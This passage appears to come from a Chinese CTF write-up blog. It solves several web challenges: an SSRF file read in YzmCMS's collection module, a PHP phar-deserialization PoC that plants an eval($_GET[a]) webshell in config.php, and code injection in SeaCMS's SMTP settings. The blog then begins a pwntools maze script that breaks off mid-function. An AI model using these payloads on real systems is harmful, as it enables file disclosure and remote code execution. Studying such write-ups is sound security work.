&lt;p&gt;找到github源码，看看最近的issue，找到个后台SSRF：https://github.com/yzmcms/yzmcms/issues/53&lt;/p&gt;
&lt;p&gt;本地跟了一下代码，在&lt;code&gt;application\collection\controller\collection_content.class.php&lt;/code&gt;的183~224行的&lt;code&gt;public function collection_article_content()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164715.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;在后台的模块管理-&amp;gt;采集管理模块处添加节点，然后网址处填写构造的恶意页面&lt;/p&gt;
&lt;p&gt;跟进&lt;code&gt;collection&lt;/code&gt;类，转到&lt;code&gt;yzmphp\core\class\collection.class.php&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164720.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;很明显无任何过滤的&lt;code&gt;file_get_content()&lt;/code&gt;，利用此进行一个SSRF可以任意文件读取&lt;/p&gt;
&lt;p&gt;尝试读&lt;code&gt;/etc/passwd&lt;/code&gt;
ssrf.html：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;leon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;httpxxx://../../../../../../etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;123&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;leon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里用httpxxx是因为&lt;code&gt;yzmphp\core\class\collection.class.php&lt;/code&gt;的189行对url协议前四位限制了http&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164727.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;配置如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164731.png&#34; alt=&#34;image-20201226151910969&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;成功读取：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164736.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;尝试读flag:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;leon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;httpxxx://../../../../../../flag&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;123&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;leon&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164739.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flag{46a41939-3d92-411f-8ba2-3dbefa6fdff0}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;hello_php&#34;&gt;hello_php&lt;/h3&gt;
&lt;p&gt;扫目录www.zip拿源码&lt;/p&gt;
&lt;p&gt;简单审计一下，文件上传、文件后缀拼接&lt;code&gt;.jpg&lt;/code&gt;、&lt;code&gt;index.php&lt;/code&gt;很明显有个文件操作函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164743.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;明显的phar反序列化，看&lt;code&gt;class.php&lt;/code&gt;找析构函数，发现对&lt;code&gt;config.php&lt;/code&gt;进行写入，于是只需要反序列化控制&lt;code&gt;$this-&amp;gt;title&lt;/code&gt;为恶意代码即可，简单写个一句话shell，绕一下正则替换：&lt;/p&gt;
&lt;p&gt;poc：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
   &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$comment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$logo_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#39;;eval(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;_GET[a]);#&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    
    &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test.phar&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Phar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test.phar&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setStub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setMetadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addFromString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stopBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;生成phar文件上传，由于文件名是&lt;code&gt;md5(time())&lt;/code&gt;，所以爆破上传一下就行&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;index.php?img=phar://./static/02b969e2b0f2619f59521f67aa8c035d.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;触发phar反序列化后,&lt;code&gt;config.php&lt;/code&gt;就写入了恶意代码，&lt;code&gt;index.php&lt;/code&gt;include了&lt;code&gt;config.php&lt;/code&gt;，所以直接:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164749.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;flag{0f131b09-a441-4723-bc02-bf4516863884}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;大家一起来审cms&#34;&gt;大家一起来审CMS&lt;/h3&gt;
&lt;p&gt;www.zip 源码&lt;/p&gt;
&lt;p&gt;是海洋cms&lt;/p&gt;
&lt;p&gt;在 adm1n/admin_smtp.php 发现了
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104165117.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接没有waf的写入，并且是往一个php文件里面写，由于一些变量可控让我们可以代码注入
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104165126.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;admin\admin登陆后台；
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104165134.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;之后访问admin_smtp.php，在点击“确认”的时候抓取数据包，改包：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104164813.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;直接来一发：
&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210104165144.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;
&lt;h3 id=&#34;签到&#34;&gt;签到&lt;/h3&gt;
&lt;p&gt;八进制&lt;/p&gt;
&lt;h3 id=&#34;问卷&#34;&gt;问卷&lt;/h3&gt;
&lt;p&gt;填写问卷&lt;/p&gt;
&lt;h3 id=&#34;babymaze1&#34;&gt;babymaze1&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#coding=utf-8&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;numpy&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;np&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#context.log_level = &amp;#39;DEBUG&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Get_T&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x23&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# black &lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x20&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x01&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# white&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x24&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# flag&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2A&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x02&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x02&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;###############################&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;up&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# 到达了数组顶端&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
